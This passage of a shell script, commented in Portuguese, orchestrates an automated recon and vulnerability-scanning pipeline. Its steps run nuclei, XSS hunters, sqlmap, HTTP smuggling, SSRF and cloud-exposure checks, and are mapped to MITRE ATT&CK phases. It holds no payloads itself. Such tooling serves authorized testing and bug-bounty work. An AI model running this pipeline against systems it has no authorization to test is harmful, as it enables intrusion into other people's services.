  _step "Swagger / OpenAPI" 14 $TOTAL
  swaggerUIdetect

  _step "API Recon" 15 $TOTAL
  APIRecon

  _step "Smart CVE scan (por tech stack)" 16 $TOTAL
  smartCveScan

  _step "Cloud exposure (S3/GCS/Azure)" 17 $TOTAL
  cloudEnum

  _step "Jira SSRF" 18 $TOTAL
  jiraScan

  _step "HTTP Smuggling" 19 $TOTAL
  smuggling

  _step "SQLi Avançado (SQLmap)" 20 $TOTAL
  sqliAdvanced

  _done "wellnuclei"
  echo "${yellow}Arquivos gerados:${reset}"
  echo "  nuclei_quality/   — findings com quality control"
  echo "  cve_results/      — CVEs por tech stack"
  echo "  nucPanel / gitvector / lfivector / ssrfdetect"
  echo "  rcevector / sqlivector / sstivector"
  echo "  xssnuclei / openredirectVector / exposurevector"
  echo "  nucleiTakeover / graphqldetect / swaggerUI"
  echo "  nucleiapirecon / cloudnuclei / jiraNuclei"
  echo "  smuggler_op.txt / sqli_results/"
}

# =============================================================================
# wellxss — Pipeline completo de XSS
# =============================================================================
wellxss() {
  _banner "WELL XSS — Full XSS Pipeline"
  local TOTAL=6

  _step "Descoberta de parâmetros (paramspider + arjun)" 1 $TOTAL
  paramspider
  arjunScan

  _step "Coleta de URLs via waymore + filtro XSS" 2 $TOTAL
  xsshunter

  _step "kxss + knoxnl" 3 $TOTAL
  xssknox

  _step "XSS via nuclei (tags xss)" 4 $TOTAL
  XssScan

  _step "CORS check (pode refletir em XSS)" 5 $TOTAL
  Corstest

  _step "Open redirects" 6 $TOTAL
  OpenRedirectScan

  _done "wellxss"
  echo "${yellow}Arquivos gerados:${reset}"
  echo "  xssvector / airixss.txt / FreqXSS.txt"
  echo "  XSSresult (dalfox) / xssSuccess (knoxnl)"
  echo "  xssnuclei / openredirectVector"
}

# =============================================================================
# wellall — Pipeline COMPLETO do zero ao resultado (MITRE ATT&CK full cycle)
# =============================================================================
wellall() {
  _banner "WELL ALL — Pipeline Completo (MITRE ATT&CK)"
  echo "${yellow}Fases: Reconnaissance → Resource Development → Initial Access → Discovery → Collection${reset}"
  echo "${yellow}Isso vai rodar: wellrecon → wellosint → wellcrawler → wellcodereview → welldirs → wellnuclei → wellxss${reset}"
  echo "${yellow}Tempo estimado: 2-6h dependendo do alvo e escopo${reset}"
  echo ""
  echo -n "Confirma? [s/N] "
  read confirm
  [[ "$confirm" != "s" && "$confirm" != "S" ]] && echo "Abortado." && return 1

  local START=$(date +%s)
  # Pinned workspace — qualquer função que muda pwd não vai contaminar o pipeline
  local WORKSPACE="$PWD"
  echo "${green}[+] Workspace fixado: $WORKSPACE${reset}"

  # TA0043 — Reconnaissance
  cd "$WORKSPACE" && wellrecon
  cd "$WORKSPACE" && wellosint

  # TA0001/TA0009 — Crawl + Code Review
  cd "$WORKSPACE" && wellcrawler
  cd "$WORKSPACE" && wellcodereview

  # T1083 — Directory Discovery
  cd "$WORKSPACE" && welldirs

  # TA0007/TA0006 — Vulnerability Discovery
  cd "$WORKSPACE" && wellnuclei
  cd "$WORKSPACE" && wellxss

  cd "$WORKSPACE"

  # Relatório final
  local END=$(date +%s)
  local ELAPSED=$(( (END - START) / 60 ))

  _banner "RELATÓRIO FINAL"
  echo "${green}Tempo total: ${ELAPSED} minutos${reset}"
  echo ""
  echo "${yellow}=== RESULTADOS ===${reset}"
  for f in ALLHTTP 200HTTP 403HTTP clean.subdomains \
            crawlerResults.txt js_livelinks.txt \
            rcevector sqlivector sstivector lfivector ssrfdetect \
            xssnuclei airixss.txt XSSresult \
            graphqldetect swaggerUI nucleiapirecon \
            exposurevector nucleiTakeover \
            cloudnuclei js_secrets_result \
            nuclei_quality/findings.txt nuclei_quality/confirmed_hc.txt \
            cve_results/high_critical.txt \
            dirs/all_dirs.txt dirs/dir_nuclei_findings.txt \
            code_review/semgrep_findings.txt code_review/trufflehog_results.txt \
            code_review/gitleaks_findings.txt \
            backups/sensitive_files.txt \
            dorks/dork_results.txt dorks/github_dork_results.txt \
            osint/emails.txt; do
    if [ -s "$f" ]; then
      echo "  ${green}✔${reset} $f ($(wc -l < $f) linhas)"
    fi
  done

  echo ""
  echo "${yellow}=== SEM RESULTADO ===${reset}"
  for f in rcevector sqlivector sstivector lfivector ssrfdetect \
            xssnuclei airixss.txt XSSresult \
            graphqldetect swaggerUI nucleiapirecon \
            exposurevector nucleiTakeover \
            nuclei_quality/confirmed_hc.txt \
            cve_results/high_critical.txt \
            dirs/dir_nuclei_findings.txt \
            code_review/semgrep_findings.txt; do
    if [ ! -s "$f" ]; then
      echo "  ${red}✗${reset} $f"
    fi
  done
}
